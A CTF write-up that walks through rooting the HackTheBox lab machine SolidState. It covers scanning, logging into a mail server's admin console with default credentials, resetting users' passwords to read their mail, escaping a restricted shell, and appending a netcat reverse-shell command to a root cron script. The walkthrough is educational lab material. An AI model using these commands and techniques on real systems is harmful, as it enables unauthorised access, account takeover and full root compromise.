[Main Page](../index.html) \| [Blog](https://github.com/berzerk0/GitPage/wiki/Post-Listing) \| [CTF Writeups](../CTF-Writeups/CTF-index.html) \| [How-To Guides](../How-To Guides/HowTo-index.html) <br>


# CTF Writeup:
# SolidState on HackTheBox
<br>
![A0](https://i.imgur.com/TiihkOi.png)
<br>
## 27 January 2018



## Introduction



From a bird's eye view, SolidState is a beginner’s CTF.<br>

However, if you are able to solve it, you are well on your way to the more intermediate level CTFs. This box requires actual enumeration, exploit research and investigation, and prior knowledge. It is a great test of your ability to understand what exactly you should looking for while enumerating. It’s a fun one.


There is a key concept that you will have to know about ahead of time.<br>
The box does not offer much in the way of a hint in it’s direction. <br>


I was able to solve it by browsing through Ben Clark’s *Red Team Field Manual* and researching enumeration and privilege escalation guides online.<br>

Shoutout to [g0tm1lk](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) and [mubix]( https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List) for excellent PrivEsc and Enumeration guides.


This write up assumes that the reader is using Kali, but any pentesting distro such as [BlackArch](https://blackarch.org/) will work.
The tools come with a stock Kali installation, unless otherwise mentioned.



## 1. Initial Scans

Before anything else, I added the IP to my `/etc/hosts` for convenience as `solidstate.htb` <br>


I began with my [benmap.sh]( https://github.com/berzerk0/textfiles/blob/master/Shell_Scripts/benmap.sh) script, which runs nmap in stages.


The most important outputs came from an `nmap` command that was similar to

* `nmap -F solidstate.htb`

<br>
![A1]( https://i.imgur.com/nMLbDQc.png)
<br>

Our scan finds the box is running
* SSH at port 22
* SMTP at port 25
* HTTP at port 80
* POP3 at port 110
* NNTP at port 119


Ports 25, 110 and 119 all seemed to contain software named __James__, a solid place to begin investigating. However, I like to start with HTTP scans. I set those in motion before investigating James.

`nikto` and `dirsearch` are must-runs when investigating HTTP.


* `nikto -h http://solidstate.htb -o nikto_result.txt`


<br>
![A2](https://i.imgur.com/d1g9ekt.png)
<br>


I like to do my web directory bruteforcing with [dirsearch.]( https://github.com/maurosoria/dirsearch)


* `dirsearch -u http://solidstate.htb -e php,txt,html,jpg,gif,htm,js,aspx --plain-text-report=dirsearch_quick_result`


<br>
![A3]( https://i.imgur.com/de8eWiN.png)
<br>


I’ve included the results here, but I began digging at James before they had finished.

James runs on SMTP and POP3, it might be some kind of email-related service.<br>
Maybe [findsploit]( https://github.com/1N3/Findsploit) has something interesting

* `findsploit james`


<br>
![A4](https://i.imgur.com/AGa2CVV.png)
<br>


That RCE script matches our James version.
Why not just run it and see if we get RCE?


<br>
![A5](https://i.imgur.com/ElLnxJ3.png)
<br>


*"Payload will be executed when someone logs in."*

Who is going to log in, though?<br>
Another HackTheBox user? I’d rather not wait for that.


RCE usually entails some sort of powerful access. <br>
There has to be something we can dig out of the module itself.


## 2. Enumerating James

If we look into the exploit code, we might be able to determine what gives the exploit its effectiveness and redirect it in some way.



<br>
![A6](https://i.imgur.com/80AyjM7.png)
<br>


The exploit script contains credentials!<br>
Both username and password are `root` - real top-notch security. <br>

Just for the hell of it, I tried `ssh root@solidstate.htb` with the password `root`<br>
This didn’t work, unsurprisingly.


The exploit is attempting to connect to port *4555*. Maybe we can do that ourselves using `nc` ?


* `nc solidstate.htb 4555` <br>

Use `root` as both username and password when asked.

<br>
![A7]( https://i.imgur.com/Ud58gyW.png)
<br>


`help` tells us about the ability to create a new user. <br>
Will our new user have access to the system in some way?<br>
Let’s see what happens.



* `adduser frank beans`
* `quit`

<br>
![A8]( https://i.imgur.com/BqSWnB9.png)
<br>


Frank is here to cause trouble, but what can he *do*? <br>
Our `nmap` scan provides some guidance.


* SMTP is used to *send* emails. <br>
* POP3 is used to *read* emails. <br>
* NNTP is for Usenet, which I know nothing about. If we run out of ideas, we'll come back to this.


It’s pretty unlikely someone is going to be sending Frank any new emails. However, it is possible that James has some automated features in place to get our "new user" up to speed. <br>

Will Frank get an email containing a randomly generated SSH password? We better check his inbox at the POP3 port.



* `nc telnet solidstate.htb 110` didn't work.

How can we connect to this port? I searched online for an answer.


Eventually, I found that POP3 can be communicated with over `telnet`. I had never used POP3 commands before, but a quick online search showed it wasn't tough to operate.<br>


* `telnet solidstate.htb 110`
* `USER frank`
* `PASS beans`
* `LIST` - this command shows information on messages for the current user

<br>
![A9](https://i.imgur.com/X2jxwoJ.png)
<br>


No messages for Frank.<br>
The interface on port 4555 also allowed me to change the passwords for the other users.<br>
Maybe one of them has something interesting in their inbox?


* `nc solidstate.htb 4555`
* `listusers`

(This is detailed in the image below)

We see a username with `bash_completion.d` exists, I bet this was created by the exploit script we ran earlier.<br>
If there aren’t any interesting emails, we will look into that.


Using the `setpassword` command, we can set all passwords to `beans`.

<br>
![A10]( https://i.imgur.com/ki4NPdL.png)
<br>

It wasn't very likely, but we should see if `beans` gets us SSH access to any of the accounts.

It didnt.

Oh well, now we can use the same email-checking process we used for Frank, but for all the users.

We start with `mailadmin` and `james` - but quickly find that neither had any mail.

So, we move on to the other users, going down the list and checking inboxes. All but one turns up empty.


<br>
![A11]( https://i.imgur.com/cTXYfdh.png)
<br>

Mindy has two emails for us.

* `RETR 1`

<br>
![A12]( https://i.imgur.com/sMEDnAo.png)
<br>

Mindy is a new hire at SolidState security.<br>
Perhaps their IT system gives them some sort of `changeme` type of password at first?<br> Worth a try.
Let’s see what is behind email door #2, first.


* `RETR 2`

<br>
![A13]( https://i.imgur.com/NDmcqRC.png)
<br>


```
...Here are your ssh credentials...

username: mindy
pass: P@55W0rd1!2@
```


How nice of them to communicate these in the CLEAR via email.<br>

Passwords in plaintext emails is not a great idea.
After we exploit her credentials, maybe Mindy can get this organization to abandon this practice.


* `ssh mindy@solidstate.htb`

<br>

## 3. Mindy's Great Escape


As soon as we log in, we see that something is fishy here.


<br>
![A14](https://i.imgur.com/hXiOCNe.png)
<br>
![A15]( https://i.imgur.com/MCM7MQz.png)
<br>



Look at all this mess in the terminal, let's `clear` it away.

<br>
![A16](https://i.imgur.com/mhJd3rq.png)
<br>


No `clear`? That can't be good. <br>
I hope I can grab the user flag, at least.

<br>
![A17](https://i.imgur.com/Vl8diUv.png)
<br>

User flag captured!



The fact that we can't use `clear` or most other commands is intolerable.<br>

I didn't know what was causing such a limited shell, so I tried the a command to gain a tty.

* `python -c 'import pty; pty.spawn("/bin/bash")`


Unfortunately, this didn't do the trick. <br>

What other information do we have?

Well, when I tried `clear`, the error message included the term `rbash`. <br>

What does `rbash` mean?<br>

I did a quick search online which lead me to [this SANS article.](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)<br>
It was my understanding that as soon as we logged in with `ssh`, the system locked us into the restricted shell.<br>

 Before doing this box, I had done [Bandit at overthewire.org.](http://overthewire.org/wargames/bandit/) <br>
One of the levels was solved by running `ssh` with another command *"attached."*
This attached command would run faster than an automatic *kick user* command, allowing the user to maintain access.

Perhaps that method could be deployed here?


I tried to combine the idea of running a command in tandem with the `ssh` command with the ideas in the SANS paper. This is what I came up with:


* `ssh mindy@solidstate.htb vi`

Then, from within the `vi` text editor, running `:!bash`.


This line runs `vi` before the system can apply `rbash`. <br>
Then, we can take advantage of `vi`'s ability to run shell commands from within the text editor to start a `bash` shell.


While this *did* work, I ultimately found a more elegant method.


* `ssh mindy@solidstate.htb bash`


`bash` itself is run as a command, skipping the `vi` step.<br>
This shell still doesn't have a tty, but that isn't anything our Python command can't fix.

* `python -c 'import pty;pty.spawn("/bin/bash")'`

<br>
![A18](https://i.imgur.com/E8ZmR6S.png)
<br>

<br>


## 4. Enumeration

Armed with a decent shell, it's time to get some information about the system.


`cat /etc/*release*` tells us we are dealing with Debian.
Ubuntu CTFs don't like the simplest `nc` reverse shell, but vanilla Debian machines do!
I haven't memorized any of the reverse shell commands yet, but `nc local.machine.ip.addr PORT -e /bin/bash` isn't hard to remember.



`sudo -l` is worth a shot, since we have Mindy's password.<br>

Unfortunately, we find out that Mindy doesn't have access to `sudo.`This might mean we have to exploit or RevShell our way to root.


To start enumeration, we do a quick `ls` in some commonly used directories like `/home` and `/opt.`

`/home` came up empty at first glance, but `/opt` held promise.
We know the system is running `james` - so maybe there are some useful configuration files.

* `ls /opt`
* `ls -la /opt`

<br>
![A19](https://i.imgur.com/BywMsv6.png)
<br>


One of these files is noteworthy: `tmp.py`.<br>
It is owned by `root`, but we have write permissions. I smell a PrivEsc!

* `cd /opt`
* `cat tmp.py`

<br>
![A20](https://i.imgur.com/hsREnfc.png)
<br>


This script seems to just erase the contents of the `/tmp` folder.<br>
Is the `root` user expecting me to put something in there? <br>
If they didn't want us to store things in `/tmp/` I'm sure there is some other method that could prevent us from doing so.<br>
Even if we were prevented from writing to `/tmp`, we can put things in another directory like `/dev/shm`



`rm -r /tmp/*` seems like the kind of command that would be run repeatedly, on a regular asis.. <br>
If it was just going to be run once, the root user would just run the command.<br>
It's likely that this script is run automatically, and likely periodically.<br>
Does `root` run it with a cronjob?

<br>

### Rambling, Skippable Side Note
It wasn't until I had already been attempting this box for some time did I learn about the existence of cronjobs.<br>
I had to come across the concept in my other attempts to familiarize myself with Linux. <br>
This underscores a need to understand the fundamentals of the OS.<br>
If you don't understand the OS, it is a lot more difficult to exploit it.


The idea for cronjobs being important here is hinted at by the name.<br>
Solid-State implies no moving parts.<br>
Thematically, this concept is the opposite of this box, which runs a script without any user input.<br>


My academic background included classes on circuit design, and the term *Solid State* got conflated with the concept of *steady-state*.<br>
This confusion ended up helping me put the pieces together.<br>
When introduced to time-dependent circuitry, such as LC circuits, problems often include an important phrase.<br>

*Assume that at t=0, the circuit had been in steady-state for a long time.*<br>

This is meant to convey that the circuit had been unchanging until we began obvserving it.<br>
At this point, connections are made and any stored energy in capacitors or inductors begins to move around.<br>

Mixing up Solid-State and Steady-State - I ended up stumbling upon the key concept.




## 5. Waiting For the Root to Sprout

If the script is run as a cronjob, then we just need to add a line that starts a reverse shell.
Since the script would be executed as root, the created shell would have root privileges.


We want to catch this shell as soon as the command is sent, so let's set up our listener before altering the script.


On our local machine, we run:

* `nc -lnvp PORTNUM`


Next, we need to edit the script to include our revshell command.<br>
But, before we do this, let's make a copy of the original `tmp.py` - in case we bungle our editing process.<br>

* `cp /opt/tmp.py /dev/shm/copy.py`
<br>

I did *not* do this while editing, made a typo and ended up having to reset the box. <br>

We can't write it to `/tmp`, since that gets cleaned out with our script. <br>
We can't write it to `/opt`, since we don't have permission. <br>
`/dev/shm` is a good location. We have write access, and it is cleared upon reboot.

The original, unedited script contains a nice example on how to run `bash` commands from within python. <br>

````
import os
import sys

...

os.system('BASH COMMANDS')
````

We can use this method with our own, shell-spawning bash commands.
Append the command for the simple `nc` revshell onto `tmp.py` using `echo` and `>>`


* `echo "os.system('nc local.machine.ip.addr PORTNUM -e /bin/bash')" >> tmp.py`


<br>
![alt1](https://i.imgur.com/A3yVjgI.png)
<br>

Make sure your `PORTNUM` matches the listener.

<br>
![alt2](https://i.imgur.com/8gOPlvx.png)
<br>



With the trap set, all we have to do is wait for the cronjob to run.<br>
If the process takes more than 5-10 minutes, you have done something wrong.
Start by checking for typos, incorrect IPs, ports, etc.


#### Soon...

<br>
![A23](https://i.imgur.com/KwNR7Xl.png)
<br>


The root shell pops open in our 2nd listener!

From here we can do as we please, starting with the capture of the root flag.

`cat /root/root.txt`



## 7. Conclusion

My experience with this box underscored how important it is to actually be familiar with the territory.<br>
I haven't been using Linux very long, and there is so much to know, so much that MIGHT be useful, that it can be paralyzing to find a place to start.

In this instance, I was able to find a foothold based on context and some prior knowledge. But I got a bit lucky. There have been boxes that stumped me because I *knew* there was something I just hadn't learned yet.<br>
<br>
Time to crack open some books.



*Thanks to HackTheBox and ch33zplz for this CTF!*

<br>
[Main Page](../index.html) \| [Blog](https://github.com/berzerk0/GitPage/wiki/Post-Listing) \| [CTF Writeups](../CTF-Writeups/CTF-index.html) \| [How-To Guides](../How-To Guides/HowTo-index.html) <br>
